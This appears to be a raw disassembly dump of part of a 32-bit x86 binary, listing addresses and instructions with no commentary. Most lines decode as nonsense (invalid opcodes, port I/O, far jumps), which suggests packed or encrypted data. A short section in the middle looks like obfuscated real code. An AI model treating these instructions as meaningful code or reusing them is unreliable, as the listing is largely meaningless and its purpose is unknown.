  40ab5a:	scas   eax,DWORD PTR es:[edi]
  40ab5b:	imul   ecx,DWORD PTR [edi+ebp*2+0x6f],0xffffffca
  40ab60:	mov    BYTE PTR [esi-0x49],dh
  40ab63:	ficom  DWORD PTR es:[eax]
  40ab66:	push   ecx
  40ab67:	sub    bl,BYTE PTR [esi+ebp*4+0x1f0f1039]
  40ab6e:	mov    esp,0xc0fe34c7
  40ab73:	sub    al,ch
  40ab75:	mov    dh,0x25
  40ab77:	cld    
  40ab78:	adc    bh,al
  40ab7a:	dec    edi
  40ab7b:	mov    dl,0xe1
  40ab7d:	xchg   DWORD PTR [edi-0x41],eax
  40ab80:	or     ch,BYTE PTR [ebx+0x75]
  40ab83:	ins    BYTE PTR es:[edi],dx
  40ab84:	pop    edx
  40ab85:	ins    DWORD PTR es:[edi],dx
  40ab86:	push   esp
  40ab87:	push   0x52
  40ab89:	sahf   
  40ab8a:	adc    eax,DWORD PTR [ebx+0x51]
  40ab8d:	aaa    
  40ab8e:	mov    BYTE PTR [ebx+ecx*1-0x32e407f],cl
  40ab95:	shl    BYTE PTR [esi+ebp*2],0xf4
  40ab99:	pop    ebx
  40ab9a:	cli    
  40ab9b:	fistp  QWORD PTR [ebp-0x20]
  40ab9e:	sub    edx,DWORD PTR [edx]
  40aba0:	loop   0x40ab41
  40aba2:	mov    edx,0xd5bd309d
  40aba7:	jns    0x40abff
  40aba9:	int3   
  40abaa:	cld    
  40abab:	xchg   DWORD PTR [edi+edx*1],ecx
  40abae:	xchg   ebx,eax
  40abaf:	(bad)  
  40abb0:	bound  ebx,QWORD PTR [ebp+0x7c98414b]
  40abb6:	inc    esi
  40abb7:	mov    eax,ds:0xad872c74
  40abbc:	mov    ebp,0x1cdd1d48
  40abc1:	lds    ecx,FWORD PTR [edx-0x51]
  40abc4:	mov    al,0x56
  40abc6:	add    ebx,DWORD PTR [esi]
  40abc8:	sub    BYTE PTR [eax+0xe35b130],0x7e
  40abcf:	enter  0xfbd6,0x9c
  40abd3:	pop    esp
  40abd4:	jmp    0xdcfa:0xbc18f14f
  40abdb:	mov    dl,0xd3
  40abdd:	test   eax,0x4d62b375
  40abe2:	sbb    al,0x9e
  40abe4:	push   ebp
  40abe5:	in     eax,0x7a
  40abe7:	push   edi
  40abe8:	inc    ebx
  40abe9:	xchg   esi,eax
  40abea:	fwait
  40abeb:	call   DWORD PTR [ebx-0xde0621e]
  40abf1:	pop    eax
  40abf2:	rol    DWORD PTR [ebx-0x23],0xdd
  40abf6:	mov    ebx,0x154011c4
  40abfb:	mov    ds,WORD PTR ds:0x316f940
  40ac01:	rol    BYTE PTR [edx-0x2e],1
  40ac04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac05:	mov    al,ds:0x200caf6
  40ac0a:	push   ds
  40ac0b:	lods   eax,DWORD PTR ds:[esi]
  40ac0c:	sub    al,0xcc
  40ac0e:	fs mov bh,0x5c
  40ac11:	sub    DWORD PTR [ecx+0xb],edx
  40ac14:	scas   eax,DWORD PTR es:[edi]
  40ac15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac16:	sub    ecx,DWORD PTR [eax+0x6a91937a]
  40ac1c:	retf   
  40ac1d:	out    0x9f,eax
  40ac1f:	lods   al,BYTE PTR ds:[esi]
  40ac20:	in     eax,dx
  40ac21:	adc    edx,edx
  40ac23:	and    eax,0x40cf97f0
  40ac28:	es lahf 
  40ac2a:	mov    ds:0xe0270812,al
  40ac2f:	mov    al,ds:0xe0674d89
  40ac34:	jmp    0x42085c1d
  40ac39:	mov    al,0x8f
  40ac3b:	cdq    
  40ac3c:	in     al,0x4b
  40ac3e:	arpl   WORD PTR [ebx],cx
  40ac40:	adc    DWORD PTR [ebp-0x2fde910f],eax
  40ac46:	outs   dx,BYTE PTR ds:[esi]
  40ac47:	pop    ebx
  40ac48:	xor    BYTE PTR [eax],al
  40ac4a:	and    DWORD PTR [ecx+0x50d3a8e3],0x7a6a0b00
  40ac54:	mov    dl,0x72
  40ac56:	or     BYTE PTR [ebx+ebp*1+0x2b],0x2a
  40ac5b:	jg     0x40aca3
  40ac5d:	ins    DWORD PTR es:[edi],dx
  40ac5e:	enter  0xf442,0x1b
  40ac62:	shl    DWORD PTR [esi-0x3d],0xdf
  40ac66:	mov    ebx,0x40edc968
  40ac6b:	loopne 0x40ac7d
  40ac6d:	scas   al,BYTE PTR es:[edi]
  40ac6e:	imul   eax,DWORD PTR [edx-0x93cfc12],0x7f
  40ac75:	cdq    
  40ac76:	in     al,dx
  40ac77:	inc    esi
  40ac78:	sub    dh,BYTE PTR ds:0xa335c159
  40ac7e:	pop    edi
  40ac7f:	nop
  40ac80:	add    DWORD PTR [ecx+0x676632b4],ebx
  40ac86:	xchg   ebx,eax
  40ac87:	in     eax,dx
  40ac88:	xor    eax,edi
  40ac8a:	mov    dl,0x68
  40ac8c:	std    
  40ac8d:	les    edi,FWORD PTR [eax+0x19]
  40ac90:	pop    ebx
  40ac91:	xor    dl,dl
  40ac93:	mov    ch,0x5f
  40ac95:	sub    BYTE PTR [esi],0xec
  40ac98:	cmc    
  40ac99:	idiv   BYTE PTR [edx+0x5c]
  40ac9c:	inc    ebp
  40ac9d:	mov    BYTE PTR [ebp-0x1cfa4350],0xd9
  40aca4:	retf   
  40aca5:	pop    ss
  40aca6:	enter  0xa641,0x66
  40acaa:	pop    edx
  40acab:	ins    BYTE PTR es:[edi],dx
  40acac:	sbb    BYTE PTR [ecx+eiz*2+0x7f491719],ch
  40acb3:	rol    BYTE PTR [esi+0x6c],cl
  40acb6:	jns    0x40ac71
  40acb8:	out    dx,eax
  40acb9:	mov    ah,bh
  40acbb:	xor    dl,ah
  40acbd:	lods   eax,DWORD PTR ds:[esi]
  40acbe:	sub    BYTE PTR ds:0xfb3ee405,dh
  40acc4:	and    edx,DWORD PTR [esi-0x7f]
  40acc7:	mov    ecx,0x6b2cb6fc
  40accc:	jo     0x40ac69
  40acce:	out    0x33,eax
  40acd0:	stos   DWORD PTR es:[edi],eax
  40acd1:	pop    esp
  40acd2:	aad    0x9f
  40acd4:	leave  
  40acd5:	fbstp  TBYTE PTR [eax-0x51362e12]
  40acdb:	sub    DWORD PTR [ecx+ebp*1+0x74702e93],ebx
  40ace2:	in     eax,dx
  40ace3:	std    
  40ace4:	pop    edx
  40ace5:	jns    0x40ad12
  40ace7:	adc    eax,0xbe29656c
  40acec:	ja     0x40ad1d
  40acee:	dec    esp
  40acef:	jns    0x40ad59
  40acf1:	push   es
  40acf2:	cmc    
  40acf3:	pop    esi
  40acf4:	jno    0x40ad12
  40acf6:	xor    edx,DWORD PTR [ebx]
  40acf8:	retf   0xc0bb
  40acfb:	and    eax,0x41bb22a4
  40ad00:	cmp    eax,0xe71d85a8
  40ad05:	std    
  40ad06:	and    bh,BYTE PTR [esi+edx*1]
  40ad09:	gs sahf 
  40ad0b:	ja     0x40ad25
  40ad0d:	jns    0x40ad1d
  40ad0f:	ror    dl,1
  40ad11:	into   
  40ad12:	mov    edi,0xd334ad7b
  40ad17:	dec    ebp
  40ad18:	dec    ebp
  40ad19:	cld    
  40ad1a:	mov    ah,cl
  40ad1c:	mov    ds,WORD PTR [eax]
  40ad1e:	cmp    dh,dl
  40ad20:	icebp  
  40ad21:	push   edi
  40ad22:	imul   esi,DWORD PTR [ebx],0xffffff9a
  40ad25:	inc    ebx
  40ad26:	int3   
  40ad27:	mov    edx,0xfdc8d406
  40ad2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad2e:	mov    ch,0xea
  40ad30:	fisttp QWORD PTR [eax+ebp*8]
  40ad33:	mov    edi,0xc20adecc
  40ad38:	cmp    BYTE PTR [eax-0x7e],cl
  40ad3b:	cmp    al,0xf8
  40ad3d:	xchg   esi,eax
  40ad3e:	pop    ebp
  40ad3f:	xor    BYTE PTR [eax],dl
  40ad41:	sbb    BYTE PTR [edi+0x47887e74],bh
  40ad47:	mov    BYTE PTR [ebp-0x30],bl
  40ad4a:	(bad)  
  40ad4b:	popa   
  40ad4c:	(bad)  
  40ad4d:	lahf   
  40ad4e:	pop    edx
  40ad4f:	es xor al,0xf9
  40ad52:	mov    edx,0x1a7d709c
  40ad57:	inc    ecx
  40ad58:	dec    esi
  40ad59:	ret    0xe71b
  40ad5c:	and    dl,cl
  40ad5e:	adc    BYTE PTR ds:0x1aa2333b,dl
  40ad64:	ss jmp 0x40ad0c
  40ad67:	sub    esp,DWORD PTR [eax-0x74]
  40ad6a:	repnz push 0x5771013e
  40ad70:	jmp    0xc3681ff3
  40ad75:	test   ah,0x75
  40ad78:	push   es
  40ad79:	mov    ch,0xf2
  40ad7b:	cmp    BYTE PTR [eax+0x4b],cl
  40ad7e:	gs dec ebp
  40ad80:	xchg   edi,eax
  40ad81:	clc    
  40ad82:	cmc    
  40ad83:	ret    
  40ad84:	dec    esp
  40ad85:	pop    esi
  40ad87:	sti    
  40ad88:	cdq    
  40ad89:	aam    0x68
  40ad8b:	enter  0x4157,0xf3
  40ad8f:	sbb    bh,BYTE PTR [eax]
  40ad91:	add    BYTE PTR [ebx+0x14],bh
  40ad94:	outs   dx,BYTE PTR ds:[esi]
  40ad95:	je     0x40ad7a
  40ad97:	out    dx,al
  40ad98:	test   eax,0xea29758d
  40ad9d:	add    BYTE PTR [ebx-0x28],bl
  40ada0:	in     al,0x3a
  40ada2:	mov    ah,0x17
  40ada4:	push   es
  40ada5:	cli    
  40ada6:	xor    eax,0x1167d46d
  40adab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adac:	mov    ah,0xeb
  40adae:	cmc    
  40adaf:	stos   DWORD PTR es:[edi],eax
  40adb0:	and    al,BYTE PTR [ebx+0x6]
  40adb3:	adc    bh,BYTE PTR [edi-0x58697e5c]
  40adb9:	aam    0xa3
  40adbb:	add    al,0x5f
  40adbd:	xchg   ecx,eax
  40adbe:	int    0x11
  40adc0:	inc    esi
  40adc1:	xchg   ebp,eax
  40adc2:	pop    edi
  40adc3:	or     al,0x5f
  40adc5:	adc    dl,BYTE PTR [ebp+0x3ee61b1a]
  40adcb:	in     eax,0x79
  40adcd:	push   cs
  40adce:	mul    ch
  40add0:	jecxz  0x40ad7a
  40add2:	mov    eax,ds:0x8a84e31
  40add7:	sbb    al,0x7
  40add9:	pop    edi
  40adda:	bound  esi,QWORD PTR [edx]
  40addc:	(bad)  
  40adde:	icebp  
  40addf:	jp     0x40addb
  40ade1:	add    bh,ch
  40ade3:	sar    dh,0x22
  40ade6:	push   0xfda2db64
  40adeb:	idiv   DWORD PTR [edx+0x292fb515]
  40adf1:	ror    BYTE PTR [eax+0x34],cl
  40adf4:	jns    0x40adc9
  40adf6:	mov    cs,WORD PTR [ecx+0x6ef7a16c]
  40adfc:	and    BYTE PTR [ecx],cl
  40adfe:	in     al,0x7d
  40ae00:	cmp    eax,0x46047c72
  40ae05:	lds    edx,FWORD PTR [ecx+0x34]
  40ae08:	clc    
  40ae09:	pop    ss
  40ae0a:	das    
  40ae0b:	into   
  40ae0c:	or     edi,edi
  40ae0e:	sub    edi,DWORD PTR [edx+0x2c]
  40ae11:	adc    eax,0x66333af9
  40ae16:	fild   QWORD PTR [eax]
  40ae18:	adc    BYTE PTR [ebp+0x15427a37],ch
  40ae1e:	sub    al,0x17
  40ae20:	pusha  
  40ae21:	push   edi
  40ae22:	jecxz  0x40ade3
  40ae24:	add    dl,BYTE PTR [esi+edx*4]
  40ae27:	js     0x40ae65
  40ae29:	cmp    al,0xb3
  40ae2b:	ds push edx
  40ae2d:	in     eax,dx
  40ae2e:	daa    
  40ae2f:	stos   BYTE PTR es:[edi],al
  40ae30:	jb     0x40ae2d
  40ae32:	mov    cl,0x63
  40ae34:	std    
  40ae35:	test   al,0x91
  40ae37:	cmp    eax,0xc82e31c4
  40ae3c:	(bad)  
  40ae3d:	jp     0x40ae09
  40ae3f:	dec    edi
  40ae40:	jno    0x40adc9
  40ae42:	not    BYTE PTR [ecx]
  40ae44:	xlat   BYTE PTR ds:[ebx]
  40ae45:	mov    bl,0x89
  40ae47:	xchg   edi,eax
  40ae48:	fadd   st(7),st
  40ae4a:	inc    ebp
  40ae4b:	loopne 0x40ae10
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x42827b,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428243
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x428377,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x42825b
  40aea0:	cmp    DWORD PTR ds:0x42827b,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x4280ab
  40aebd:	call   DWORD PTR ds:0x428e68
  40aec3:	mov    ecx,DWORD PTR ds:0x4282fb
  40aec9:	xor    DWORD PTR ds:0x42821f,ecx
  40aecf:	or     DWORD PTR ds:0x42836b,ecx
  40aed5:	or     DWORD PTR ds:0x428283,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x42828f
  40aee1:	adc    DWORD PTR ds:0x428257,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x428153
  40aeef:	adc    ecx,DWORD PTR ds:0x428377
  40aef5:	mov    DWORD PTR ds:0x428153,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x428373,0x4282e7
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x428153,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	loopne 0x40af7b
  40af31:	ret    
  40af32:	jl     0x40aee9
  40af34:	sbb    ebx,DWORD PTR [eax]
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	pop    esi
  40af3c:	sbb    dh,al
  40af3e:	loopne 0x40aec5
  40af40:	or     al,0x37
  40af42:	push   ebx
  40af43:	push   es
  40af44:	fisubr DWORD PTR [edi+0x7ef2cfdb]
  40af4a:	cli    
  40af4b:	inc    edi
  40af4c:	xor    al,0xfc
  40af4e:	jp     0x40afcb
  40af50:	add    eax,0x515f5b83
  40af55:	mov    esi,ebp
  40af57:	stos   DWORD PTR es:[edi],eax
  40af58:	jnp    0x40afc8
  40af5a:	or     cl,al
  40af5c:	pop    ecx
  40af5d:	mov    gs,WORD PTR [esi+0x4a2b2e62]
  40af63:	and    edx,DWORD PTR [eax]
  40af65:	inc    DWORD PTR [esi-0xf95342]
  40af6b:	mov    ah,0x27
  40af6d:	cmp    esp,DWORD PTR [edi+0x22782d0b]
  40af73:	ror    DWORD PTR [eax-0x159c6572],cl
  40af79:	add    al,0x1c
  40af7b:	and    DWORD PTR [edx],0xbd97ca36
  40af81:	(bad)  [ecx-0x14]
  40af84:	sahf   
  40af85:	popa   
  40af86:	sbb    al,0x57
  40af88:	pop    ds
  40af89:	inc    edi
  40af8a:	push   es
  40af8b:	sub    al,0x43
  40af8d:	lods   al,BYTE PTR ds:[esi]
  40af8e:	shl    DWORD PTR [ecx+0x77ef1a3d],cl
  40af94:	fnstsw WORD PTR [eax-0x428ff43d]
  40af9a:	stos   DWORD PTR es:[edi],eax
  40af9b:	or     eax,edi
  40af9d:	gs test eax,0x95869f16
  40afa3:	(bad)  
  40afa4:	xchg   ecx,eax
  40afa5:	cmp    al,0xf
  40afa7:	es enter 0xde82,0x9d
  40afac:	adc    edi,0x46d2b9b9
  40afb2:	(bad)  
  40afb3:	push   esp
  40afb4:	mov    ds:0xe0078df5,eax
  40afb9:	popa   
  40afba:	(bad)  
  40afbb:	out    0x9b,al
  40afbd:	div    DWORD PTR [ebp-0x71]
  40afc0:	pop    ebx
  40afc1:	imul   ebx,esi,0x30f63755
  40afc7:	xchg   edx,eax
  40afc8:	sbb    DWORD PTR [edi],0xffffff9c
  40afcb:	and    al,0xe3
  40afcd:	adc    BYTE PTR [edi],0x7d
  40afd0:	repz arpl WORD PTR [edx+edi*2+0x56],sp
  40afd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afd6:	stos   DWORD PTR es:[edi],eax
  40afd7:	std    
  40afd8:	xchg   ebx,eax
  40afd9:	out    dx,eax
  40afda:	jns    0x40b058
  40afdc:	into   
  40afdd:	in     eax,dx
  40afde:	mov    esp,DWORD PTR [ebp+edi*2+0x2a3eb6a9]
  40afe5:	pop    ss
  40afe6:	mov    bl,BYTE PTR [edi]
  40afe8:	xor    al,0xc2
  40afea:	push   cs
  40afeb:	stos   BYTE PTR es:[edi],al
  40afec:	dec    sp
  40afee:	sbb    bl,BYTE PTR [edx+0x27]
  40aff1:	frstor [ecx+0x17c28c68]
  40aff7:	mov    edx,0x8091f0fc
  40affc:	fst    DWORD PTR [edi+0x6f864afa]
  40b002:	fild   WORD PTR [esi+ecx*1-0x1247f3a0]
  40b009:	mov    ebp,0xa13a103
  40b00e:	push   0xfffffff7
  40b010:	jmp    0x96d6:0x27319467
  40b017:	fcmovnb st,st(1)
  40b019:	jbe    0x40b07c
  40b01b:	jae    0x40aff9
  40b01d:	sbb    cl,BYTE PTR [edi-0x2e]
  40b020:	sti    
  40b021:	pop    ebx
  40b022:	outs   dx,DWORD PTR ds:[esi]
  40b023:	inc    ecx
  40b024:	call   0xa7cacb93
  40b029:	fsubr  st,st(0)
  40b02b:	jno    0x40b078
  40b02d:	clc    
  40b02e:	or     DWORD PTR [ebx+0x2d],eax
  40b031:	imul   ecx,ebp,0xffffffe1
  40b034:	sub    esi,DWORD PTR [ebp+0x27740991]
  40b03a:	mov    al,BYTE PTR [esi+esi*1-0x2f]
  40b03e:	and    DWORD PTR [ebp+0x4a439b36],ebp
  40b044:	je     0x40b08e
  40b046:	hlt    
  40b047:	mov    edx,0x4b4df964
  40b04c:	pusha  
  40b04d:	add    dl,BYTE PTR es:[ebx-0x76f3fe1f]
  40b054:	fnstcw WORD PTR [edi]
  40b056:	inc    cx
  40b058:	ret    
  40b059:	push   eax
  40b05a:	mov    esp,0x552b284a
  40b060:	ds ins BYTE PTR es:[edi],dx
  40b062:	xlat   BYTE PTR ds:[ebx]
  40b063:	or     eax,0x910362fb
  40b068:	es hlt 
  40b06a:	adc    eax,0x3355a204
  40b06f:	sbb    al,0xad
  40b071:	mov    al,0xa2
  40b073:	push   ecx
  40b074:	div    BYTE PTR [ebx+0x6951da83]
  40b07a:	jmp    0x40b0e6
  40b07c:	out    0x74,al
  40b07e:	addr16 dec eax
  40b080:	shr    BYTE PTR [ebp-0x32fc6ceb],cl
  40b086:	dec    ebx
  40b087:	outs   dx,DWORD PTR ds:[esi]
  40b088:	fmulp  st(7),st
  40b08a:	ja     0x40b030
  40b08c:	fist   WORD PTR [edx+0x23]
  40b08f:	and    bl,BYTE PTR [edi+0x1a]
  40b092:	lods   al,BYTE PTR ds:[esi]
  40b093:	xchg   ecx,eax
  40b094:	arpl   WORD PTR [edx],bx
  40b096:	test   BYTE PTR [eax+esi*4],ah
  40b099:	lds    ebx,FWORD PTR [edi+0x6f]
  40b09c:	fmul   DWORD PTR [eax+edx*4]
  40b09f:	dec    esi
  40b0a0:	or     BYTE PTR ds:0xf615d1d5,ah
  40b0a6:	mul    DWORD PTR [ebp+0x18]
  40b0a9:	pushf  
  40b0aa:	xchg   esp,eax
  40b0ab:	sbb    BYTE PTR [ecx],al
  40b0ad:	aas    
  40b0ae:	jl     0x40b0d6
  40b0b0:	fist   WORD PTR [ebx]
  40b0b2:	retf   
  40b0b3:	pop    esp
  40b0b4:	(bad)  
  40b0b5:	out    dx,al
  40b0b6:	lahf   
  40b0b7:	(bad)  
  40b0b8:	fcomp  QWORD PTR [ecx+0x169ba62c]
  40b0be:	mov    eax,0xfed1e735
  40b0c3:	inc    esi
  40b0c4:	xor    BYTE PTR ds:0x9b7eab72,dh
  40b0ca:	imul   ecx
  40b0cc:	jmp    0x40b0fe
  40b0ce:	retf   0x647a
  40b0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0d2:	inc    edx
  40b0d3:	shl    edx,cl
  40b0d5:	sbb    eax,0xc905956
  40b0da:	push   edx
  40b0db:	cli    
  40b0dc:	shr    BYTE PTR [esi-0x3b17860a],cl
  40b0e2:	push   esi
  40b0e3:	shr    BYTE PTR [eax],0xa9
  40b0e6:	xor    DWORD PTR [ebp+0x1],eax
  40b0e9:	hlt    
  40b0ea:	xor    eax,0xca2e1bb0
  40b0ef:	mov    cl,0xad
  40b0f1:	cdq    
  40b0f2:	push   es
  40b0f3:	xchg   ebx,eax
  40b0f4:	(bad)  
  40b0f5:	sbb    DWORD PTR [edx+ecx*2-0x8],ebp
  40b0f9:	adc    dl,BYTE PTR [eax+0x3d]
  40b0fc:	xchg   BYTE PTR [edi-0x33],dh
  40b0ff:	inc    edx
  40b100:	xchg   DWORD PTR [ebp-0x4641bd1d],edx
  40b106:	jl     0x40b0a3
  40b108:	(bad)
  40b10c:	mov    bl,0x2d
  40b10e:	je     0x40b149
  40b110:	fwait
  40b111:	sbb    BYTE PTR [edx-0x541d1413],cl
  40b117:	shl    esi,1
  40b119:	iret   
  40b11a:	pusha  
  40b11b:	jb     0x40b111
  40b11d:	xchg   esi,eax
  40b11e:	(bad)  
  40b11f:	leave  
  40b120:	imul   ebx,eax,0x772de8c8
  40b126:	pop    edx
  40b127:	or     bh,BYTE PTR ds:0x428049de
  40b12d:	rcr    DWORD PTR [ebp+ebp*1-0x19],cl
  40b131:	out    dx,eax
  40b132:	adc    ebx,DWORD PTR [eax]
  40b134:	fldenv [ebp-0x7b77370c]
  40b13a:	push   ebx
  40b13b:	push   esp
  40b13c:	pop    ebp
  40b13d:	pop    ds
  40b13e:	mov    BYTE PTR [esi-0x38],dl
  40b141:	ficom  WORD PTR ds:0x84d02fc6
  40b147:	and    eax,0xdf12297a
  40b14c:	cld    
  40b14d:	test   edx,eax
  40b14f:	mov    ds:0x2c17d3a7,al
  40b154:	mov    ecx,0xcef898db
  40b159:	std    
  40b15a:	mov    edx,0x76a2fe9d
  40b15f:	fbld   TBYTE PTR [edi+0x18a40e30]
  40b165:	adc    al,ch
  40b167:	jmp    0x40b144
  40b169:	pusha  
  40b16a:	div    BYTE PTR ds:0xce48aa9c
  40b170:	xchg   DWORD PTR [edx*2-0x47ea15b5],esp
  40b177:	jmp    0x97e4:0x4ddcd839
  40b17e:	push   esp
  40b17f:	outs   dx,BYTE PTR ds:[esi]
  40b180:	ins    BYTE PTR es:[edi],dx
  40b181:	xchg   ecx,eax
  40b182:	lock sub al,0xb6
  40b185:	mov    dh,0x8c
  40b187:	and    eax,0xde1999a9
  40b18c:	aas    
  40b18d:	leave  
  40b18e:	or     dl,BYTE PTR [edx-0x43a22559]
  40b194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b195:	sbb    bl,BYTE PTR [ebx+0x7]
  40b198:	push   ebx
  40b199:	add    DWORD PTR [ecx-0x4f9c85a8],0xffffffdc
  40b1a0:	mov    ah,0x45
  40b1a2:	mov    bh,0x70
  40b1a4:	dec    edi
  40b1a5:	mov    ecx,DWORD PTR [esi]
  40b1a7:	dec    ecx
  40b1a8:	add    bh,BYTE PTR [ecx]
  40b1aa:	xor    DWORD PTR [esi],ebp
  40b1ac:	(bad)  [ebx]
  40b1ae:	jns    0x40b1ca
  40b1b0:	jnp    0x40b179
  40b1b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1b3:	(bad)  
  40b1b4:	(bad)  
  40b1b6:	adc    bl,ch
  40b1b8:	fld    QWORD PTR [ebp+0x5b]
  40b1bb:	rcr    DWORD PTR [ebx+0x3f],0x27
  40b1bf:	(bad)  
  40b1c0:	stc    
  40b1c1:	rcl    eax,1
  40b1c3:	mov    edi,0x569796cd
  40b1c8:	out    0x13,eax
  40b1ca:	in     al,dx
  40b1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1cc:	aas    
  40b1cd:	cwde   
  40b1ce:	cmp    dh,BYTE PTR [edx]
  40b1d0:	inc    edx
  40b1d1:	jl     0x40b1e7
  40b1d3:	cwde   
  40b1d4:	or     DWORD PTR [esi+0x3f94d173],ebx
  40b1da:	mov    ebx,0xe82904ae
  40b1df:	pop    ebp
  40b1e0:	mov    ebx,0x1a6d1654
  40b1e5:	fcmovne st,st(5)
  40b1e7:	jno    0x40b1c9
  40b1e9:	sbb    dl,bl
  40b1eb:	mov    edi,0xaed88db7
  40b1f0:	xchg   ebp,eax
  40b1f1:	rcl    DWORD PTR [edi],cl
  40b1f3:	cwde   
  40b1f4:	cwde   
  40b1f5:	loop   0x40b19e
  40b1f7:	icebp  
  40b1f8:	pop    ebp
  40b1f9:	xor    eax,0x2ec35241
  40b1fe:	add    al,0xb
  40b200:	jmp    0xc228:0x7305d7d1
  40b207:	xchg   BYTE PTR [edi],ah
  40b209:	push   eax
  40b20a:	leave  
  40b20b:	scas   eax,DWORD PTR es:[edi]
  40b20c:	fwait
  40b20d:	call   0x3760:0x98277ea5
  40b214:	mov    esi,0x4ab5543
  40b219:	mov    dh,0x3a
  40b21b:	push   eax
  40b21c:	movzx  esi,si
  40b21f:	imul   ebp,esp,0x2bed283d
  40b225:	pop    es
  40b226:	push   0x79
  40b228:	test   al,0x76
  40b22a:	push   eax
  40b22b:	enter  0xcbf1,0xba
  40b22f:	popa   
  40b230:	push   edi
  40b231:	and    al,0x1e
  40b233:	adc    dh,BYTE PTR [ecx]
  40b235:	xchg   ecx,eax
  40b236:	int3   
  40b237:	rep stos DWORD PTR es:[edi],eax
  40b239:	dec    esi
  40b23a:	pop    esp
  40b23b:	lds    edi,FWORD PTR [eax]
  40b23d:	mov    bl,0x51
  40b23f:	sti    
  40b240:	mov    eax,edx
  40b242:	idiv   ah
  40b244:	ins    DWORD PTR es:[edi],dx
  40b245:	cs xor al,0xc7
  40b248:	mov    ah,0xc8
  40b24a:	inc    eax
  40b24b:	ds neg ebp
  40b24e:	fldenv [edx+0x76]
  40b251:	mov    al,BYTE PTR [ebx-0x2f]
  40b254:	fsubr  DWORD PTR [edx+0x50]
  40b257:	sub    eax,0x4cbf41f1
  40b25c:	sbb    eax,ebx
  40b25e:	fndisi(8087 only) 
  40b260:	ins    DWORD PTR es:[edi],dx
  40b261:	cmp    dl,ah
  40b263:	and    dl,BYTE PTR [ebx]
  40b265:	sub    esi,DWORD PTR [ecx+0x5fb6eab7]
  40b26b:	xor    ah,dh
  40b26d:	cs pop edi
  40b26f:	cwde   
  40b270:	pop    edi
  40b271:	xlat   BYTE PTR gs:[ebx]
  40b273:	rcl    DWORD PTR [ecx-0x1d7f06ee],0x52
  40b27a:	and    al,dh
  40b27c:	push   0xffffffb9
  40b27e:	inc    esp
  40b27f:	pop    edi
  40b280:	push   cs
  40b281:	popa   
  40b282:	jo     0x40b2eb
  40b284:	mov    bh,0x6e
  40b286:	jecxz  0x40b2b6
  40b288:	rcr    BYTE PTR [esi+0x27b22e7b],1
  40b28e:	sbb    DWORD PTR [ecx],ebp
  40b290:	sar    edi,0x4b
  40b293:	push   esp
  40b294:	fdivr  st(4),st
  40b296:	jge    0x40b268
  40b298:	stc    
  40b299:	xchg   ecx,eax
  40b29a:	dec    ecx
  40b29b:	loopne 0x40b2a7
  40b29d:	and    al,0xe6
  40b29f:	pop    ebp
  40b2a0:	fdivrp st(4),st
  40b2a2:	fisttp QWORD PTR ds:0xf9b94518
  40b2a8:	rcr    ch,0x1c
  40b2ab:	rol    DWORD PTR [ecx-0x55afd130],0x21
  40b2b2:	ins    BYTE PTR es:[edi],dx
  40b2b3:	jmp    0x887d:0x63b9444f
  40b2ba:	clc    
  40b2bb:	ret    
  40b2bc:	es ds push ecx
  40b2bf:	gs fmul st(0),st
  40b2c2:	inc    edi
  40b2c3:	cmp    BYTE PTR ds:0x615ae251,bl
  40b2c9:	xchg   DWORD PTR ds:[ecx+0x4b],eax
  40b2cd:	dec    ecx
  40b2ce:	mov    BYTE PTR [ecx+edi*4+0x5e],bl
  40b2d2:	add    bh,BYTE PTR [edx+0x2a560875]
  40b2d8:	repz add esi,DWORD PTR [edi+0x55390535]
  40b2df:	or     DWORD PTR [edi-0x6e],ebp
  40b2e2:	mov    ebx,DWORD PTR [edx]
  40b2e4:	repnz push ebx
  40b2e6:	pop    es
  40b2e7:	call   0x8f4c2cb4
  40b2ec:	aam    0x3f
  40b2ee:	cmp    eax,edi
  40b2f0:	xor    DWORD PTR [ebx+0x3a649914],esp
  40b2f6:	stos   BYTE PTR es:[edi],al
  40b2f7:	inc    ebp
  40b2f8:	cmp    dh,ah
  40b2fa:	scas   eax,DWORD PTR es:[edi]
  40b2fb:	adc    esi,DWORD PTR [ebx-0x538a7223]
  40b301:	jmp    0xf80e:0xd63edbd8
  40b308:	push   es
  40b309:	mov    ebp,0x675ae8f6
  40b30e:	or     esi,esi
  40b310:	inc    ebx
